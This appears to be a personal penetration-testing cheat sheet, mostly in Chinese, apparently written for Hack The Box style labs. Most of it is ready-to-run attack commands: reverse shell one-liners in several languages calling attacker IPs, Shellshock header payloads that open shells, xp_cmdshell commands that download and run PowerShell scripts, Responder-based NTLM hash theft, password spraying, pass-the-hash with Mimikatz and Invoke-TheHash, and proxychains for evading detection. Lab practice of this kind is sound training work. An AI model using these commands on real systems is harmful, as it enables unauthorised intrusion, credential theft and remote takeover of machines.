>Here's where I drop whatever comes to my mind

### 掃描目錄
+ [dirsearch](https://github.com/maurosoria/dirsearch)
+ [gobuster](https://github.com/OJ/gobuster)
+ [dirb](https://github.com/v0re/dirb)
+ [ffuf](https://github.com/ffuf/ffuf)
>ffuf -u http://HTBIP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.websiteaddress'
>https://github.com/danielmiessler/SecLists
+ [feroxbuster](https://github.com/epi052/feroxbuster)
>feroxbuster -u HTBIP -x php,html -f -n 

### 網路掃描工具
+ [nmap](https://nmap.org/)
>nmap -sV -sC -A -T4 HTBIP
+ [RustScan](https://github.com/RustScan/RustScan)
+ [pnscan](https://github.com/ptrrkssn/pnscan)

### [Reverse Shell Cheat Sheet](https://pentestmonkey.net/)

+ [Bind Shell / Reverse Shell](https://ithelp.ithome.com.tw/articles/10279849)
>Reverse shell是從目標主機對攻擊者主機發起連線，而Bind Shell是先在目標主機上綁定特定port，然後等來自攻擊者主機對目標主機發起連線，就像後門(backdoor)一樣

+ python3 -m http.server port

+ Python
` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' `

+ [PHP](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
` php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' `

+ Ruby
` ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' `

+ [Netcat](https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498)
` nc -e /bin/sh 10.0.0.1 1234 `
>即使它有多個版本的 netcat，但其中一些不支持 -e 選項。
>如果你安裝了錯誤版本的 netcat，仍然可以像這樣恢復你的反向 shell：
` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f `

+ nmap

```
export RHOST=10.0.0.1
export RPORT=1234
TF=$(mktemp)
echo 'local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
  local r,x=t:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF
```

+ bash

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

> 確保目標的shell使用bash會在前面加上bash -c:

bash -c `bash -i >& /dev/tcp/10.0.0.1/1234 0>&1`

```

+ Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

+ [Perl](https://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

```
perl -e 'use Socket;$i="[AttackerIP]";$p=[AttackerPort];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

+ PHP 
`php -r '$sock=fsockopen("[attackerIP]",[attackerPort]);exec("/bin/sh -i <&3 >&3 2>&3");'`


### 攻擊技巧
+ [CGI-bin exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)

```
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'

# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi

# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh

# Reverse shell using curl 
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi

```

+ [Nmap Scripting Engine (NSE)](https://nmap.org/book/nse.html)

```
#列出可用腳本
locate nse

#使用默認腳本集的簡單腳本掃描。
nmap -sC example.com

#沒有端口掃描的腳本掃描；只有主機腳本才有資格運行。
nmap -sn -sC example.com

#沒有主機發現或端口掃描的腳本掃描。假定所有主機都已啟動，並且只有主機腳本才有資格運行。
nmap -Pn -sn -sC example.com

#使用腳本跟踪執行特定腳本
nmap --script smb-os-discovery --script-trace example.com

#運行帶有腳本參數的單個腳本。
nmap --script snmp-sysdescr --script-args creds.snmp=admin example.com

#執行 mycustomscripts目錄中的所有腳本以及safe類別中的所有腳本。
nmap --script mycustomscripts,safe example.com

```

+ ShellShock==Bashdoor 

```
# Bashdoor POC
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

# namp NSE ShellShock
nmap -sV -p- --script http-shellshock <target>
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>

# burpsuit can testing, need to replace User-Agent content attempt vulnerability
User-Agent: () { :;}; echo; /usr/bin/id
User-Agent: () { :;}; echo; /bin/ping -c 1 10.129.108.18
User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo; /bin/ping -c 2 10.10.14.15")'; /bin/ping -c 1 10.10.14.15
User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping -c 1 10.10.14.15")'; /usr/bin/id
```

### Spawning a TTY Shell

```
- python3 -c 'import pty; pty.spawn("/bin/sh")'  # 首先在接收到從目標主機彈回來的Shell之後，在獲得的shell執行這動作
- echo os.system('/bin/bash')
- /bin/sh -i
- perl —e 'exec "/bin/sh";'
- perl: exec "/bin/sh";
- ruby: exec "/bin/sh"
- lua: os.execute('/bin/sh')
- exec "/bin/sh"
```

### decrypt
+ [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/)
> Decrypt the given Group Policy Preferences string
`gpp-decrypt __`

### SMB
+ [smbclient](https://oldgrayduck.blogspot.com/2021/06/centos7-smbclient-windows.html?m=0)

```
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
smbclient -L //<attackerIP>/<folder> --option='client min protocol=NT1'

nmap --script smb-vuln* -p port IP

#Download all
smbclient //<IP>/<share>

```

+ smbmap

```
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbmap -u admin -p password1 -d workgroup -H IP

```

+ enum4linux

```
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>
```

+ SMB server version
```
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```

### [NetBIOS](https://www.kali.org/tools/nbtscan/)
+ nbtscan
`nbtscan -r 192.168.0.1/24`

+ NBNSpoof 

### WhoPort
+ 139,445 => SMB


### 後滲透利用工具
[CrackMapExec](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
```
# Target format
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb 192.168.10.1 -u "" up ""

# Bruteforcing and Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt

```

### 遠程系統獲取 shell

>impacket套件內的psexec，執行命令之後會刪除對應的服務，隱蔽性更佳，而且impacket套件內的psexec支持PTH(哈希傳遞)

+ [PsExec](https://www.poftut.com/use-psexec-tools-run-commands-get-shell-remote-windows-systems/)

`psexec.exe -s -i cmd.exe`


### [LM，NTLM，Net-NTLMv2](https://book.hacktricks.xyz/windows-hardening/ntlm)

[Responder](https://github.com/lgandx/Responder)
[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

```
# steal NTLM hash
responder -I <interface> -v
SQL> exec master ..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' 

#try to enable code execution 
SQL> enable_xp_cmdshell

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 

# connect smb server, this should steal the ntlm hash, need to use with responder tool
SQL> exec master ..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' 
```

### crack hash 
+ hashcat
  + `hashcat -a 0 hashes ~/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt`
  + `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O`

### Invoke-TheHash

+ Invoke-SMBExec

`Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
`

+ Invoke-WMIExec

`Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose`

+ Invoke-SMBClient

`Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose`

+ Invoke-SMBEnum

`Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose`

+ Invoke-TheHash

`Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0`

+ Invoke-PowershellTcp

```
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port

The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress tun0IP -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```

>此功能是所有其他功能的混合。 您可以傳遞多個主機，排除某人並選擇您要使用的選項（SMBExec、WMIExec、SMBClient、SMBEnum）。 如果您選擇 SMBExec 和 WMIExec 中的任何一個，但您沒有提供任何 Command 參數，它只會檢查您是否有足夠的權限。

### Pass-the-Hash

+ Mimikatz
` Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' `

### Forensics

+ [Binwalk 分離提取隱寫的文件](https://github.com/ReFirmLabs/binwalk) 
`binwalk -e [__.xlsm] --run-as=root`
+ Office analyzer
  + [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator)
  + [officeparser](https://github.com/unixfreak0037/officeparser)
  `python2.7 officeparser.py [__.xlsm] --extract-macros`
  + [oletools](https://github.com/decalage2/oletools)
  + [pcodedmp](https://github.com/bontchev/pcodedmp)
  + [ViperMonkey](https://github.com/decalage2/ViperMonkey)
  + [oledump](https://blog.didierstevens.com/programs/oledump-py/)


### MSSQL

> 使用 Impacket mssqlclient，您將不需要執行手動操作，例如使用 SQL 腳本語言構建查詢以激活 xp_cmdshell。Impacket 讓事情變得更容易
+ [impacket 需先下載](https://github.com/SecureAuthCorp/impacket)

```
命令激活 cmdshell 功能

1> EXEC SP_CONFIGURE 'show advanced options',1
2> reconfigure 
3> go
Configuration option 'show advanced options' changed from 0 to 1. Run the
RECONFIGURE statement to install.
(return status = 0)

1> EXEC SP_CONFIGURE 'xp_cmdshell',1
2> reconfigure 
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE
statement to install.

```
+ IMPACKET-MSSQLCLIENT REVERSE SHELL
  + 創建反向 shell，那麼你可以執行以下命令連接回在 nishang powershell 腳本中定義的 netcat 服務器
    + `SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://tun0IP:ncport/rv.ps1\")`
    + `EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(”http://tun0IP:ncport/rev.ps1”) | powershell -noprofile'`
  
### Proxy
+ [proxychains](https://github.com/haad/proxychains)
```
ProxyChains 是一種工具，可通過各種代理（如 SOCKS4、SOCKS5 或 HTTP）重定向應用程序建立的 TCP 連接。ProxyChains 可以將多個代理串在一起，從而更難識別原始 IP 地址。這些鏈通常用於紅隊交戰中，使藍隊隊員很難追踪到原始 IP 地址。在使用 ProxyChains 時，您可以使用 SSH、telnet、wget 和 Nmap 等各種工具來逃避檢測。

將 Nmap 與 ProxyChains 一起使用，合併 Nmap 和 ProxyChains 是一種非常常用的技術，用於在進行滲透測試時將流量路由到內部網絡。這種工具組合有效地允許客戶端環境中的電腦通過 SSH SOCKS5 代理匯集所有 Nmap 的流量。

proxychains nmap -sS <Target’s IP Address>

```

